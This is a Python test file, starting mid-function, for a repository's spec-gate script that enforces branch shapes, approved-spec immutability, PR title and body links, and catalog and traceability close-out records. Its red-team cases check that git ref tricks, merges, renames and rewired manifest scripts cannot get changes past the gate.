    _git(repo, "add", SPEC)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    # nor does one main has since superseded, nor one a local main ahead of origin/main holds (red-team, this PR)
    _git(repo, "reset", "-q", "HEAD", "--", SPEC)
    _git(repo, "checkout", "-q", "--", SPEC)
    _git(repo, "checkout", "-q", "main")
    write(repo, SPEC, spec(status="superseded"))
    _git(repo, "commit", "-qam", "superseded on main")
    _git(repo, "checkout", "-q", "docs/spec-feat-model-001-v2")
    write(repo, SPEC, spec(done_when=["something easier"]))
    _git(repo, "add", SPEC)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    _git(repo, "reset", "-q", "HEAD", "--", SPEC)
    _git(repo, "checkout", "-q", "--", SPEC)
    _git(repo, "update-ref", "refs/remotes/origin/main", "base")
    _git(repo, "checkout", "-q", "main")
    _git(repo, "checkout", "-q", "docs/spec-feat-model-001-v2", "--", newer)
    _git(repo, "commit", "-qm", "v2 approved on a local main")
    _git(repo, "checkout", "-q", "docs/spec-feat-model-001-v2")
    write(repo, newer, spec(done_when=["changed after main took it"]))
    _git(repo, "add", newer)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    # nor does one only another remote's main holds, as a fork's upstream, its name holding a slash (red-team, this PR)
    _git(repo, "remote", "add", "team/fork", str(repo))
    _git(repo, "update-ref", "refs/remotes/team/fork/main", "main")
    _git(repo, "branch", "-q", "-f", "main", "base")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    _git(repo, "branch", "-q", "-f", "main", "refs/remotes/team/fork/main")
    _git(repo, "remote", "remove", "team/fork")
    if sys.platform.startswith("linux"):   # names that are no UTF-8: Windows cannot decode them, APFS refuses them
        # nor does one whose remote's name is no UTF-8, beside another that decodes alike (red-team, this PR)
        held, stale = (os.fsdecode(b"refs/remotes/\xe8/main"), os.fsdecode(b"refs/remotes/\xe9/main"))
        _git(repo, "update-ref", held, "main")
        _git(repo, "update-ref", stale, "base")
        _git(repo, "branch", "-q", "-f", "main", "base")
        _git(repo, "pack-refs", "--all")
        r = gate(repo, "--commit")
        assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
        _git(repo, "branch", "-q", "-f", "main", held)
        _git(repo, "update-ref", "-d", held)
        _git(repo, "update-ref", "-d", stale)
    # a main whose object is missing is unreadable, so it freezes rather than drops out (red-team, this PR)
    upstream = _git(repo, "rev-parse", "main")
    _git(repo, "branch", "-q", "-f", "main", "base")
    (repo / ".git/refs/remotes/origin").mkdir(parents=True, exist_ok=True)   # packed above, its folder pruned
    (repo / ".git/refs/remotes/origin/main").write_text("1" * 40 + "\n")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    (repo / ".git/refs/remotes/origin/main").unlink()
    # nor does one that names main's tree rather than its commit
    _git(repo, "update-ref", "refs/remotes/origin/main", f"{upstream}^{{tree}}")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    # nor one that is broken: an empty ref file, a symref to nothing
    (repo / ".git/refs/remotes/origin/main").write_text("")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    (repo / ".git/refs/remotes/origin/main").unlink()
    _git(repo, "symbolic-ref", "refs/remotes/origin/main", "refs/remotes/origin/gone")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    _git(repo, "symbolic-ref", "-d", "refs/remotes/origin/main")
    _git(repo, "update-ref", "refs/remotes/origin/main", "base")
    # nor does one a merge brings in from a main newer than any ref here holds, in progress or committed
    # (red-team, this PR)
    _git(repo, "reset", "-q", "HEAD", "--", newer)
    _git(repo, "checkout", "-q", "--", newer)
    _git(repo, "merge", "-q", "--no-ff", "--no-commit", upstream)
    write(repo, newer, spec(done_when=["changed after main took it"]))
    _git(repo, "add", newer)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and f"{newer}: an approved spec does not change in place" in r.stdout, r.stdout
    # and from below the root, where git reports MERGE_HEAD relative to the root it runs in
    r = subprocess.run([sys.executable, str(repo / "scripts/gate/spec_gate.py"), "--commit"], cwd=repo / "docs",
                       capture_output=True, text=True, env={k: v for k, v in os.environ.items()
                                                            if not k.startswith(("PR_", "SPEC_GATE_", "GIT_", "PYTEST_"))})
    assert r.returncode == 1 and f"{newer}: an approved spec does not change in place" in r.stdout, r.stdout
    _git(repo, "merge", "--abort")
    if sys.platform.startswith("linux"):   # a path that is no UTF-8: Windows cannot decode it, APFS refuses it
        # and in a linked worktree whose git dir's path is no UTF-8, which git reports whole (red-team, this PR)
        tree = repo.parent / os.fsdecode(repo.name.encode() + b"-wt-\xe9")
        _git(repo, "worktree", "add", "-q", "-b", "docs/spec-feat-model-001-wt", str(tree), "HEAD")
        _git(tree, "merge", "-q", "--no-ff", "--no-commit", upstream)
        write(tree, newer, spec(done_when=["changed after main took it"]))
        _git(tree, "add", newer)
        r = gate(tree, "--commit")
        assert r.returncode == 1 and f"{newer}: an approved spec does not change in place" in r.stdout, r.stdout
        _git(repo, "worktree", "remove", "--force", str(tree))
        _git(repo, "branch", "-q", "-D", "docs/spec-feat-model-001-wt")
    _git(repo, "merge", "-q", "--no-ff", "--no-edit", upstream)
    write(repo, newer, spec(done_when=["changed after main took it"]))
    _git(repo, "add", newer)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    _git(repo, "reset", "-q", "--hard", "HEAD^1")   # drop the merge, or what it brought in freezes every later step
    write(repo, newer, spec(done_when=["changed after main took it"]))
    _git(repo, "add", newer)
    _git(repo, "branch", "-q", "-f", "main", upstream)
    # a branch named origin/main, which a short name reads first, does not stand in for the remote one
    _git(repo, "update-ref", "refs/remotes/origin/main", "main")
    _git(repo, "branch", "-q", "-m", "main", "trunk")
    _git(repo, "branch", "-q", "origin/main", "base")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    _git(repo, "branch", "-q", "-D", "origin/main")
    _git(repo, "update-ref", "-d", "refs/remotes/origin/main")
    # with no main to read, the branch's own HEAD decides, as before; a branch named main/old or a tag named
    # refs/heads/main is not main, and another repository's main shares no history to measure by (red-team, this PR)
    _git(repo, "branch", "-q", "main/old", "base")
    _git(repo, "tag", "refs/heads/main", "base")
    other = _git(repo, "commit-tree", "-m", "another repository", _git(repo, "hash-object", "-t", "tree", "/dev/null"))
    _git(repo, "update-ref", "refs/remotes/skills/main", other)
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout


def test_a_detached_head_commit_must_name_its_branch(repo):
    """stocks#1205 r4117591691 (spec_gate.py:30).

    A detached checkout reports its branch as `HEAD`, which the old gate
    exempted. A detached commit that stages code is refused with the override
    in the message; with the override the named branch is checked as usual.
    Documentation alone still commits.
    """
    _git(repo, "checkout", "-q", "--detach", "base")
    write(repo, "docs/notes.md", "# Notes\n")
    _git(repo, "add", "docs/notes.md")
    # stocks#1205 r4120166762: documentation too commits from a delivery branch, so a
    # detached HEAD names one with the override
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "is not a delivery branch" in r.stdout, r.stdout
    assert gate(repo, "--commit", SPEC_GATE_BRANCH="docs/notes").returncode == 0
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "SPEC_GATE_BRANCH=feature/<feat-id>-<slug> git commit" in r.stdout, r.stdout
    assert gate(repo, "--commit", SPEC_GATE_BRANCH=BRANCH).returncode == 0
    assert gate(repo, "--commit", SPEC_GATE_BRANCH="tweak").returncode == 1


def test_pr_title_and_body_name_what_the_gate_validated(repo):
    """stocks#1205 r4116983578 (spec_gate.py:131); solyra#72 r4117710098 (:126)
    and r4116980738 (:131).

    The old gate took any FEAT-ID in the title, any path under
    docs/superpowers/specs/ and any `- [` in the body, so the PR template's
    placeholders passed. The title starts with the branch's FEAT-ID; the body
    carries the plan's spec path and each done_when item as a checkbox line.
    """
    ok = {"PR_TITLE": "FEAT-MODEL-001: state each model's decision", "PR_BODY": body()}
    assert pr(repo, BRANCH, CODE, **ok).returncode == 0
    r = pr(repo, BRANCH, CODE, **{**ok, "PR_TITLE": "FEAT-DATA-001: state each model's decision"})
    assert r.returncode == 1 and "PR title must start with 'FEAT-MODEL-001:'" in r.stdout, r.stdout
    placeholder = f"Spec: docs/superpowers/specs/....md\nPlan: {PLAN}\n\n- [ ] \n- [ ] \n"
    r = pr(repo, BRANCH, CODE, **{**ok, "PR_BODY": placeholder})
    assert r.returncode == 1, r.stdout
    assert f"PR body must link the spec the plan names: {SPEC}" in r.stdout
    assert "each done_when item as its own '- [ ]' line" in r.stdout


def test_pr_body_links_the_plan(repo):
    """stocks#1205 r4117591696 (spec_gate.py:131).

    The old body check never looked for the plan, one link of the
    FEAT-ID -> spec -> plan -> PR chain.
    """
    r = pr(repo, BRANCH, CODE, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body(plan_path=None))
    assert r.returncode == 1 and f"PR body must link the plan: {PLAN}" in r.stdout, r.stdout


def test_close_out_records_are_required_once_the_pr_is_ready(repo):
    """stocks#1205 r4116983595 (spec_gate.py:167).

    The old gate passed a PR that left the catalog and the traceability record
    stale. A draft is work in progress and is not checked. Once ready: every
    done_when box ticked, the catalog row or record changed, and the PR number
    added under its FEAT-ID in 12-PR-ISSUE-TRACEABILITY.md, or in the catalog
    row's PRs column where a repository has no such doc (solyra).
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42"}
    recorded = {**CODE, PLAN: plan(pr=42)}
    assert pr(repo, BRANCH, recorded, **meta, PR_DRAFT="true").returncode == 0
    r = pr(repo, BRANCH, recorded, **meta, PR_DRAFT="false")
    assert r.returncode == 1, r.stdout
    assert "Last reviewed" in r.stdout and "add this PR (#42)" in r.stdout

    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    assert pr(repo, BRANCH, {**recorded, CATALOG: row}, **meta, PR_DRAFT="false").returncode == 0
    # solyra#72 r4118997596: a PR cannot bring its own traceability document to move the
    # lineage check off the catalog row; which record carries it is read at the base
    stamped_only = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | none |")
    own_trace = "# Traceability\n\n## FEAT-MODEL-001\n\n- #42 state each model's decision\n"
    r = pr(repo, BRANCH, {**recorded, CATALOG: stamped_only, TRACEABILITY: own_trace}, **meta, PR_DRAFT="false")
    assert r.returncode == 1 and "row's PRs column" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**recorded, CATALOG: row}, **{**meta, "PR_BODY": body()}, PR_DRAFT="false")
    assert r.returncode == 1 and "done_when item(s) not ticked" in r.stdout, r.stdout

    trace = "# Traceability\n\n## FEAT-MODEL-001\n\n- none\n\n## FEAT-DATA-001\n\n- #42 state each model's decision\n"
    on_base(repo, {TRACEABILITY: trace})   # the other capability's section is not this change's to add
    r = pr(repo, BRANCH, {**recorded, CATALOG: row, TRACEABILITY: trace}, **meta, PR_DRAFT="false")
    assert r.returncode == 1 and "add this PR (#42) to the FEAT-MODEL-001 section's PR lineage" in r.stdout, r.stdout
    trace = trace.replace("- none\n", "- #42 state each model's decision\n")
    assert pr(repo, BRANCH, {**recorded, CATALOG: row, TRACEABILITY: trace}, **meta, PR_DRAFT="false").returncode == 0


RECORD = """
### FEAT-MODEL-001

| Field | Value |
|---|---|
| Status | Production |
| Last reviewed | 2026-08-30 |
"""


def test_close_out_checks_the_status_and_last_reviewed_fields(repo):
    """stocks#1205 r4117897774 (spec_gate.py:348); solyra#72 r4117890531 (:348).

    The close-out passed on any added catalog line that mentioned the FEAT-ID
    or sat in its section: a blank line in the stocks record, or the solyra
    row's PRs cell alone. It now reads the FEAT's Last reviewed and Status,
    from the record's field table (stocks) or the row's columns (solyra):
    Last reviewed must move to a date, and Status must be set.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    trace = "# Traceability\n\n## FEAT-MODEL-001\n\n- #42 state each model's decision\n"
    base = {**CODE, PLAN: plan(pr=42), TRACEABILITY: trace}

    # solyra shape: the PRs cell alone, Last reviewed left at unknown
    only_prs = CATALOG_TEXT.replace("| Production | unknown | none |", "| Production | unknown | #42 |", 1)
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: only_prs}, **meta)
    assert r.returncode == 1 and "Last reviewed" in r.stdout, r.stdout

    # stocks shape: the record carries the fields; base it, then touch it without changing them
    stocks_catalog = CATALOG_TEXT.replace("### FEAT-MODEL-001\n\n- Status: Production\n", RECORD.lstrip("\n"))
    _git(repo, "checkout", "-q", "main")
    write(repo, CATALOG, stocks_catalog)
    write(repo, TRACEABILITY, "# Traceability\n\n## FEAT-MODEL-001\n\n- none\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "stocks-shaped catalog and traceability record")
    _git(repo, "tag", "-f", "base")
    blank = stocks_catalog.replace("| Last reviewed | 2026-08-30 |\n", "| Last reviewed | 2026-08-30 |\n\n")
    mention = stocks_catalog + "\nFEAT-MODEL-001 was touched.\n"
    for catalog, r in each_pr(repo, lambda catalog: pr_case(BRANCH, {**base, CATALOG: catalog}, **meta), (blank, mention)):
        assert r.returncode == 1 and "Last reviewed" in r.stdout, r.stdout
    unset = stocks_catalog.replace("| Status | Production |", "| Status | TBD |").replace("2026-08-30", TODAY)
    r = pr(repo, BRANCH, {**base, CATALOG: unset}, **meta)
    assert r.returncode == 1 and "Status" in r.stdout, r.stdout
    stamped = stocks_catalog.replace("2026-08-30", TODAY)
    r = pr(repo, BRANCH, {**base, CATALOG: stamped}, **meta)
    assert r.returncode == 0, r.stdout
    # stocks#1205 r4118721669: the fields were read from the raw document, so a
    # commented-out or fenced row after the table overrode the visible one
    for hidden in (f"<!-- | Last reviewed | {TODAY} | -->", f"```\n| Last reviewed | {TODAY} |\n```"):
        section_end = stocks_catalog.index("| Last reviewed | 2026-08-30 |\n") + len("| Last reviewed | 2026-08-30 |\n")
        catalog = stocks_catalog[:section_end] + "\n" + hidden + "\n" + stocks_catalog[section_end:]
        r = pr(repo, BRANCH, {**base, CATALOG: catalog}, **meta)
        assert r.returncode == 1 and "Last reviewed" in r.stdout, (hidden, r.stdout)
    # solyra#72 r4119505526: FEAT-MODEL-0010 is not FEAT-MODEL-001's heading
    lookalike_trace = "# Traceability\n\n## FEAT-MODEL-0010\n\n- #42 second cut\n"
    r = pr(repo, BRANCH, {**base, CATALOG: stamped, TRACEABILITY: lookalike_trace}, **meta)
    assert r.returncode == 1 and "add this PR (#42)" in r.stdout, r.stdout
    # solyra#72 r4119234373: #42abc is not a reference to PR #42
    glued = stocks_catalog.replace("2026-08-30", TODAY)
    trace_glued = "# Traceability\n\n## FEAT-MODEL-001\n\n- #42abc second cut\n"   # base: stocks_catalog, lineage `- none`
    r = pr(repo, BRANCH, {**base, CATALOG: glued, TRACEABILITY: trace_glued}, **meta)
    assert r.returncode == 1 and "add this PR (#42)" in r.stdout, r.stdout
    # stocks#1205 r4118788497: shaped like a date is not a date
    r = pr(repo, BRANCH, {**base, CATALOG: stocks_catalog.replace("2026-08-30", "2026-99-99")}, **meta)
    assert r.returncode == 1 and "Last reviewed" in r.stdout, r.stdout
    # solyra#72 r4118878756: the PRs cell and the lineage only grow; a ready PR cannot
    # replace the accumulated history with its own number
    prior = CATALOG_TEXT.replace("| Production | unknown | none |", "| Production | unknown | #7, #9 |", 1)
    on_base(repo, {CATALOG: prior, PLAN: plan(pr=42), TRACEABILITY: None})
    erased = prior.replace("| unknown | #7, #9 |", f"| {TODAY} | #42 |")
    r = pr(repo, BRANCH, {**CODE, CATALOG: erased}, **meta)
    assert r.returncode == 1 and "loses earlier PR(s) #7, #9" in r.stdout, r.stdout
    kept = prior.replace("| unknown | #7, #9 |", f"| {TODAY} | #7, #9, #42 |")
    assert pr(repo, BRANCH, {**CODE, CATALOG: kept}, **meta).returncode == 0
    on_base(repo, {CATALOG: stocks_catalog, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n"})
    r = pr(repo, BRANCH, {**base, CATALOG: stamped, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #42 second cut\n"}, **meta)
    assert r.returncode == 1 and "PR lineage loses earlier PR(s) #7" in r.stdout, r.stdout
    # stocks#1205 r4119001308: a second PR the same day cannot leave the record untouched
    same_day = stocks_catalog.replace("2026-08-30", TODAY)
    on_base(repo, {CATALOG: same_day, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n"})
    r = pr(repo, BRANCH, {**base, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n- #42 second cut\n"}, **meta)
    assert r.returncode == 1 and "record is unchanged from the base" in r.stdout, r.stdout
    touched = same_day.replace("| Status | Production |", "| Status | Production |\n| Notes | second cut, #42 |")
    r = pr(repo, BRANCH, {**base, CATALOG: touched, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n- #42 second cut\n"}, **meta)
    assert r.returncode == 0, r.stdout
    on_base(repo, {CATALOG: stocks_catalog, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- none\n"})
    # solyra#72 r4118831958: a real date that is not the head commit's is a false record
    for other, r in each_pr(repo, lambda other: pr_case(BRANCH, {**base, CATALOG: stocks_catalog.replace("2026-08-30", other)}, **meta), ("2000-01-01", "2099-01-01")):
        assert r.returncode == 1 and TODAY in r.stdout, r.stdout


def test_the_plan_records_its_pr(repo):
    """solyra#72 r4117890536 (spec_gate.py:70).

    Nothing read the plan's `pr:` field, so it could stay null or name another
    PR. It must be null or a PR number; a number that is not this PR fails in
    any PR run, and once the PR is ready it must be this PR.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr="null")}, **meta, PR_DRAFT="true").returncode == 0
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=41)}, **meta, PR_DRAFT="true")
    assert r.returncode == 1 and "names PR #41" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr="soon")}, **meta, PR_DRAFT="true")
    assert r.returncode == 1 and "pr must be null or a PR number" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, CATALOG: row, PLAN: plan(pr="null")}, **meta, PR_DRAFT="false")
    assert r.returncode == 1 and "set the plan's pr to 42" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {**CODE, CATALOG: row, PLAN: plan(pr="#42")}, **meta, PR_DRAFT="false").returncode == 0


def test_every_branch_shape_the_rules_name_passes_only_its_own_work(repo):
    """stocks#1205 r4117897779 (SKILL.md:17, P1).

    AGENTS.md said every branch must be feature/ or fix/<feat-id>-<slug>, while
    the skill sends documentation to docs/, manifests to chore/, investigations
    to spike/ and the vendored skills to bot/superpowers-. AGENTS.md and
    CLAUDE.md now name all six shapes; this pins what the gate lets each carry.
    """
    skill_file = {".claude/skills/demo/helper.sh": "echo hi\n"}
    assert pr(repo, "docs/fix-typo", {"docs/notes.md": "# Notes\n"}).returncode == 0
    assert pr(repo, "docs/spec-feat-model-001", {"docs/superpowers/specs/2026-09-28-x.md": spec()}).returncode == 0
    # solyra#72 r4119296014: a spec landing alone is validated before the documentation return
    for bad, r in each_pr(repo, lambda bad: pr_case("docs/spec-feat-model-001", {"docs/superpowers/specs/2026-09-28-x.md": bad}), (spec(req_ids="[REQ-FAKE-999]"), spec(feat_id="FEAT-NOPE-001"), spec(done_when=[]))):
        assert r.returncode == 1 and "2026-09-28-x.md:" in r.stdout, r.stdout
    # stocks#1205 r4119509855: a plan is edited by its own branch; a docs/ branch may only close it
    r = pr(repo, "docs/plan-tweak", {PLAN: plan(status="done")})
    assert r.returncode == 1 and "not yet in the base's record" in r.stdout, r.stdout   # r4119610907: no PR recorded yet
    on_base(repo, {PLAN: plan(pr=42), CATALOG: CATALOG_TEXT.replace("| Production | unknown | none |", f"| Production | {TODAY} | #42 |", 1)})
    assert pr(repo, "docs/plan-tweak", {PLAN: plan(pr=42, status="done")}).returncode == 0
    on_base(repo, {PLAN: plan(), CATALOG: CATALOG_TEXT})
    r = pr(repo, "docs/plan-tweak", {PLAN: plan(branch="feature/feat-model-001-other")})
    assert r.returncode == 1 and "only the plan's own branch edits it" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-tweak", {PLAN: plan(status="done", pr=99)})
    assert r.returncode == 1 and "only the plan's own branch edits it" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-tweak", {PLAN: None})
    assert r.returncode == 1 and "a plan is not deleted" in r.stdout, r.stdout
    # solyra#72 r4119505520: nor is an approved spec deleted
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: None})
    assert r.returncode == 1 and "is not deleted" in r.stdout, r.stdout
    # solyra#72 r4119408318: an approved spec does not change in place; it is superseded
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(done_when=["something easier"])})
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    # solyra#72 r4119957714: superseded means replaced, so the approved replacement lands first
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded")})
    assert r.returncode == 1 and "no approved spec for its FEAT names it in `supersedes`" in r.stdout, r.stdout
    newer = "docs/superpowers/specs/2026-09-02-model-decisions-v2.md"
    on_base(repo, {newer: spec(supersedes=SPEC)})
    assert pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded")}).returncode == 0
    on_base(repo, {newer: None})
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded", done_when=["something easier"])})
    assert r.returncode == 1 and "does not change in place" in r.stdout, r.stdout
    # stocks#1205 r4119634437: nor is a superseded spec deleted; the done plans and the
    # replacing spec's `supersedes` still point at it
    on_base(repo, {SPEC: spec(status="superseded")})
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: None})
    assert r.returncode == 1 and "a superseded spec is not deleted" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec()})
    assert pr(repo, "chore/bump-deps", {"package-lock.json": "{}\n"}).returncode == 0
    assert pr(repo, "bot/superpowers-v5", skill_file).returncode == 0
    assert pr(repo, "bot/superpowers-v5", {**skill_file, **CODE}).returncode == 1
    assert pr(repo, "chore/refactor", CODE).returncode == 1
    assert pr(repo, "test/more-cases", {"tests/test_x.py": "def test(): pass\n"}).returncode == 1
    # stocks#1205 r4118475516: git refs are case-sensitive, so the shape is lowercase only
    assert pr(repo, BRANCH.upper(), CODE).returncode == 1
    _git(repo, "checkout", "-q", "-B", "spike/try", "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    assert gate(repo, "--commit").returncode == 0


def test_a_rename_is_seen_from_both_ends(repo):
    """solyra#72 r4117710100 (spec_gate.py:179).

    With git's default rename detection, `git diff --name-only` lists only a
    rename's destination, so moving code to a documentation path hid the code
    leaving. The gate diffs with --no-renames, in both modes.
    """
    _git(repo, "checkout", "-q", "-B", "tidy-up", "base")
    _git(repo, "mv", "lib/model.py", "docs/model.py")
    r = gate(repo, "--commit")
    # (red-team round four: a .py under docs/ is code too, so both ends of the rename are gated)
    assert r.returncode == 1 and "docs/model.py, lib/model.py" in r.stdout, r.stdout
    _git(repo, "commit", "-q", "-m", "move")
    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), _git(repo, "rev-parse", "HEAD"), PR_HEAD_REF="tidy-up")
    assert r.returncode == 1 and "docs/model.py, lib/model.py" in r.stdout, r.stdout


def test_only_catalog_rows_define_feat_ids(repo):
    """solyra#72 r4117710107 (spec_gate.py:76).

    The old gate took every FEAT-shaped string in the catalog as an entry, so an
    ID mentioned in prose authorized a branch. Only the first cell of a catalog
    table row defines one.
    """
    name = "feature/feat-fake-001-x"
    fake_spec = "docs/superpowers/specs/2026-09-03-fake.md"
    r = pr(repo, name, {**CODE,
                        CATALOG: CATALOG_TEXT + "\nFEAT-FAKE-001 is proposed for next quarter.\n",
                        fake_spec: spec(feat_id="FEAT-FAKE-001"),
                        "docs/superpowers/plans/2026-09-03-fake.md":
                            plan(feat_id="FEAT-FAKE-001", spec=fake_spec, branch=name)})
    assert r.returncode == 1 and "FEAT-FAKE-001 is not a row in" in r.stdout, r.stdout


def test_a_chore_branch_changes_only_dependency_fields(repo):
    """solyra#72 r4118278194 (spec_gate.py:69, P1).

    The chore/ allowance accepted any edit to package.json, so a chore PR could
    rewrite `scripts.test` or `scripts.build` and CI would run the new scripts
    from the checkout without a FEAT-ID, spec or plan. The gate now parses the
    manifest at the merge base and at the head and allows only the dependency
    fields to differ; pyproject.toml gets the same treatment. Lockfiles and
    requirements files hold nothing but dependencies, so they stay allowed.
    """
    package = {"name": "app", "scripts": {"test": "vitest run"}, "dependencies": {"react": "^19.0.0"}}
    pyproject = '[project]\nname = "app"\ndependencies = ["pandas==2.2.0"]\n\n[tool.pytest.ini_options]\naddopts = "-q"\n'
    _git(repo, "checkout", "-q", "main")
    write(repo, "package.json", json.dumps(package, indent=2) + "\n")
    write(repo, "pyproject.toml", pyproject)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "manifests")
    _git(repo, "tag", "-f", "base")

    bumped = {**package, "dependencies": {"react": "^19.1.0"}, "devDependencies": {"vitest": "^3.0.0"}}
    assert pr(repo, "chore/bump-deps", {"package.json": json.dumps(bumped, indent=2) + "\n"}).returncode == 0
    assert pr(repo, "chore/bump-deps", {"pyproject.toml": pyproject.replace("2.2.0", "2.2.3")}).returncode == 0
    on_base(repo, {"requirements.txt": "pandas==2.2.2\n"})
    assert pr(repo, "chore/bump-deps", {"package-lock.json": "{}\n", "requirements.txt": "pandas==2.2.3\n"}).returncode == 0
    on_base(repo, {"requirements.txt": None})

    rewired = {**package, "scripts": {"test": "true"}}
    r = pr(repo, "chore/bump-deps", {"package.json": json.dumps(rewired, indent=2) + "\n"})
    assert r.returncode == 1, r.stdout
    assert "package.json: changes scripts, not only dependencies" in r.stdout, r.stdout
    r = pr(repo, "chore/bump-deps", {"pyproject.toml": pyproject.replace('"-q"', '"-q -p no:cacheprovider"')})
    assert r.returncode == 1 and "pyproject.toml: changes tool, not only dependencies" in r.stdout, r.stdout
    # solyra#72 r4119234381: a manifest whose root is not an object is refused, not a traceback
    r = pr(repo, "chore/bump-deps", {"package.json": "[]\n"})
    assert r.returncode == 1 and "is not a JSON object" in r.stdout and "Traceback" not in r.stderr, r.stdout + r.stderr
    toolchain = {**package, "engines": {"node": ">=22"}, "packageManager": "pnpm@9"}
    r = pr(repo, "chore/bump-deps", {"package.json": json.dumps(toolchain, indent=2) + "\n"})
    assert r.returncode == 1 and "changes engines, packageManager, not only dependencies" in r.stdout, r.stdout
    r = pr(repo, "chore/bump-deps", {"package.json": "{not json\n"})
    assert r.returncode == 1 and "package.json: cannot be parsed" in r.stdout, r.stdout
    r = pr(repo, "chore/new-app", {"web/package.json": json.dumps(package) + "\n"})
    assert r.returncode == 1 and "web/package.json: a new manifest is a new project" in r.stdout, r.stdout

    _git(repo, "checkout", "-q", "-B", "chore/bump-deps", "base")
    write(repo, "package.json", json.dumps(rewired, indent=2) + "\n")
    _git(repo, "add", "package.json")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "package.json: changes scripts" in r.stdout, r.stdout


    # stocks#1205 r4118788504: main rewires scripts after the chore branch forked; the
    # manifest is classified against the merge base, so the bump is still only a bump
    _git(repo, "checkout", "-q", "-B", "chore/bump-deps", "base")
    write(repo, "package.json", json.dumps(bumped, indent=2) + "\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "bump on the chore branch")
    _git(repo, "checkout", "-q", "main")
    write(repo, "package.json", json.dumps(rewired, indent=2) + "\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main rewires scripts after the fork")
    r = gate(repo, "--pr", "main", "chore/bump-deps", PR_HEAD_REF="chore/bump-deps")
    assert r.returncode == 0, r.stdout

def test_the_canvas_handoff_is_in_the_pr_body(repo):
    """solyra#72 r4118278197 (spec_gate.py:308, P2).

    A spec with a non-empty `canvases` list passed the body check with only the
    spec path, plan path and checkboxes, so the Phase 5 handoff (`Canvas
    refresh pending: <url>`, or the report-only marker for a report-only
    canvas) could be left out and the gate still reported success. The body
    must now name every canvas the spec lists, under the marker its mode calls
    for, and a canvas the spec names must exist in canvases.yml.
    """
    refresh, report = "https://claude.ai/artifact/AAAA", "https://claude.ai/artifact/BBBB"
    canvases = ("canvases:\n"
                f"  - name: Models\n    url: {refresh}\n    repo: t/t\n    source_json: x.json\n"
                f"  - name: Architecture\n    url: {report}\n    repo: t/t\n    mode: report-only\n    source_json: null\n")
    on_base(repo, {SPEC: spec(canvases=[refresh, report]), "docs/product/canvases.yml": canvases})
    files = CODE
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}

    r = pr(repo, BRANCH, files, **title, PR_BODY=body())
    assert r.returncode == 1, r.stdout
    assert f"PR body must carry 'Canvas refresh pending: {refresh}'" in r.stdout, r.stdout
    assert f"PR body must carry 'Canvas check pending (report-only): {report}'" in r.stdout, r.stdout

